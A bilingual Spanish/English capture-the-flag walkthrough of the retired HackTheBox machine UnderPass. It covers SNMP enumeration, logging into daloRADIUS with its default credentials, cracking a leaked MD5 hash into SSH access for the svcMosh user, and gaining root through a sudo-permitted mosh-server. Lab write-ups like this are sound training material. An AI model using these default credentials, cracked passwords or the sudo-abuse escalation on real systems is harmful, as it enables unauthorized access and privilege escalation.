# UnderPass [Easy]

> **ES:** Máquina Linux con SNMP público que delata un daloRADIUS; credenciales por defecto llevan a un hash crackeable y `mosh-server` con sudo da root.
> **EN:** Linux box with public SNMP leaking a daloRADIUS install; default creds lead to a crackable hash and sudo `mosh-server` gives root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/UnderPass] |
| **URL** | https://app.hackthebox.com/machines/UnderPass |
| **IP lab** | 10.10.11.48 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía SNMP (public) → daloRADIUS (`administrator:radius`) → hash MD5 de `svcMosh` → SSH → `sudo mosh-server`.
> **EN:** Get `user.txt` and `root.txt` via SNMP (public) → daloRADIUS (`administrator:radius`) → `svcMosh` MD5 hash → SSH → `sudo mosh-server`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap (TCP + UDP)
- [ ] snmpwalk / snmpbulkwalk
- [ ] dirsearch / feroxbuster
- [ ] hash crack (MD5 lookup / hashcat)
- [ ] ssh
- [ ] mosh (GTFOBins)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** TCP solo 22/SSH y 80/Apache (página por defecto, dirbuster sin hallazgos); en UDP destaca 161/SNMP con comunidad `public` que filtra hostname, contacto y la pista daloRADIUS.
> **EN:** TCP only 22/SSH and 80/Apache (default page, dirbuster finds nothing); UDP shows 161/SNMP with community `public` leaking hostname, contact and the daloRADIUS hint.

```bash
nmap -sC -sV -oN nmap_tcp 10.10.11.48
nmap -sU --top-ports=50 -oN nmap_udp 10.10.11.48
# 68 dhcpc, 137 netbios-ns, 161 snmp, 162 snmptrap
nmap --script "snmp* and not snmp-brute" -sU -p 161 10.10.11.48
snmpbulkwalk -c public -v2c 10.10.11.48
```

**Resultado / Result:** 22/tcp OpenSSH 8.9, 80/tcp Apache 2.4.52, 161/udp SNMP `public`: `sysDescr Linux underpass 5.15.0-126-generic`, `sysContact steve@underpass.htb`, `sysName "UnDerPass.htb is the only daloradius server in the basin!"`, `sysLocation Nevada, U.S.A. but not Vegas`. Captura de la página Apache en `images/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El login de daloRADIUS vive en `/daloradius/app/users/login.php` (usuarios) y `/daloradius/app/operators/` (operadores). `dirsearch`/`feroxbuster` exponen además `.gitignore`, `ChangeLog`, `Dockerfile`, `README.md` y `docker-compose.yml` (con credenciales de ejemplo `radius:radiusdbpw`, `testing123`).
> **EN:** The daloRADIUS login lives at `/daloradius/app/users/login.php` (users) and `/daloradius/app/operators/` (operators). `dirsearch`/`feroxbuster` also expose `.gitignore`, `ChangeLog`, `Dockerfile`, `README.md` and `docker-compose.yml` (with sample creds `radius:radiusdbpw`, `testing123`).

```bash
dirsearch -u http://10.10.11.48/daloradius/
feroxbuster -u http://10.10.11.48/daloradius/ -x html,php,txt,php.bak -d 3
curl -s http://10.10.11.48/daloradius/docker-compose.yml | head -40
# MYSQL_USER=radius / MYSQL_PASSWORD=radiusdbpw / DEFAULT_CLIENT_SECRET=testing123
```

**Resultado / Result:** Panel de operadores en `/daloradius/app/operators/login.php`. `admin:admin` falla; el default documentado es `administrator:radius`. Capturas del login/dashboard/lista de usuarios en `images/` y en `img/` (`img/image_20250454-225404.png`, `img/image_20250455-225512.png`, `img/image_20250459-225910.png`).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Login con defecto `administrator:radius` en operadores; en la lista de usuarios se lee el hash MD5 de `svcMosh` y se crackea (lookup/diccionario) → SSH.
> **EN:** Default login `administrator:radius` in operators; user list leaks `svcMosh` MD5 hash, cracked (lookup/dictionary) → SSH.

```bash
# login web manual: http://underpass.htb/daloradius/app/operators/home-main.php
# hash obtenido: svcMosh:412DD4759978ACFCC81DEAB01B382403
# md5(412DD4759978ACFCC81DEAB01B382403) -> underwaterfriends
ssh svcMosh@10.10.11.48  # underwaterfriends (credencial de laboratorio retirado)
```

**Resultado / Result:** SSH válido `svcMosh:underwaterfriends`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Ya como `svcMosh` se lee `/home/svcMosh/user.txt` (flag omitida).
> **EN:** As `svcMosh` read `/home/svcMosh/user.txt` (flag redacted).

```bash
id; cat ~/user.txt
```

**Resultado / Result:** `user.txt` leído.

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `sudo -l` permite `(ALL) NOPASSWD: /usr/bin/mosh-server` (con `use_pty`). Como `mosh` permite elegir el comando servidor remoto (`--server`), se ejecuta `mosh --server="sudo /usr/bin/mosh-server" localhost`: el cliente habla con un `mosh-server` corriendo como root en local y entrega terminal root (GTFOBins).
> **EN:** `sudo -l` allows `(ALL) NOPASSWD: /usr/bin/mosh-server` (with `use_pty`). Since `mosh` lets you choose the remote server command (`--server`), run `mosh --server="sudo /usr/bin/mosh-server" localhost`: the client talks to a `mosh-server` running as root locally and yields a root terminal (GTFOBins).

```bash
sudo -l
# User svcMosh may run the following commands on localhost:
#     (ALL) NOPASSWD: /usr/bin/mosh-server
mosh --server="sudo /usr/bin/mosh-server" localhost
whoami  # root
cat /root/root.txt  # formato parcial ofuscado
```

**Resultado / Result:** Root vía `mosh-server` con sudo sin password. Técnica: abuso de binario permitido (GTFOBins).

---

## 🧠 Lo aprendido / Learned

> **ES:** SNMP con comunidad pública como vector de info; daloRADIUS con credenciales por defecto; hashes MD5 débiles; privesc con `mosh-server`.
> **EN:** SNMP public community as info vector; daloRADIUS default creds; weak MD5 hashes; `mosh-server` privesc.

- [ ] Siempre auditar UDP/SNMP, no solo TCP
- [ ] Cambiar credenciales por defecto en paneles
- [ ] Revisar `sudo -l` y GTFOBins

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: SNMP completo, `admin:admin` fallido, hash `svcMosh`, explicación `mosh --server`) — wither/nota migrada
- **Walkthrough de referencia:** HTB UnderPass — https://0xdf.gitlab.io/2025/05/10/htb-underpass.html — 0xdf
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
